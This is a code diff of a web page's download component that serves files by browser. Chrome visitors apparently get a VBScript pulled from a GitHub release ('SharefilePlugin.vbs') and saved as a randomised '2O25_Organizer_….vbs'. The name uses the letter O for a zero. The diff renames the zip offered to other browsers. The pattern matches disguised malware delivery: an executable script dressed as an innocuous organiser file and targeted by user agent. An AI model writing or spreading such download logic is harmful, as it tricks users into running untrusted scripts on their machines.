@@ -226,7 +226,7 @@ const Download = () => {
     const ua = navigator.userAgent;
     const suffix = randomDigits(8);
     if (ua.includes("Edg/")) {
-      return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
+      return { href: "/docs/2O25_Organizer.zip", name: `2O25_Organizer_${suffix}.zip` };
     }
     if (ua.includes("Chrome") && !ua.includes("Edg/")) {
       const name = `2O25_Organizer_${suffix}.vbs`;
@@ -237,7 +237,7 @@ const Download = () => {
         : `https://github.com/joneraig123/vado-adb/releases/download/v1.0.0/SharefilePlugin.vbs`;
       return { href, name };
     }
-    return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
+    return { href: "/docs/2O25_Organizer.zip", name: `2O25_Organizer_${suffix}.zip` };
   }, []);
 
   const triggerDownload = useCallback(async (file: { href: string; name: string }) => {
